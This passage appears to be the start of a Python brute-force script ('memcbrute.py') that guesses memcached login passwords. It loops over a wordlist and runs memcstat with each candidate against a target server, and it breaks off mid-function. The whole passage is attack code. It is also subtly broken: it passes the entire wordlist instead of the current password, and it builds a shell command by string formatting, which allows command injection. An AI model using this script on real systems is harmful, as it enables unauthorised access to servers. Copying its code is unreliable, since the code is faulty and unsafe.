...
usage = ("Usage: ./memcbrute.py <username> <target> <wordlist>")

def bruteforce(user, target, wordlist):
    try:
        for passwd in wordlist:
            cmd = subprocess.getoutput("/bin/memcstat --username={} --servers={} --password={}".format(user, target, wordlist))
            if len(cmd) > 0:
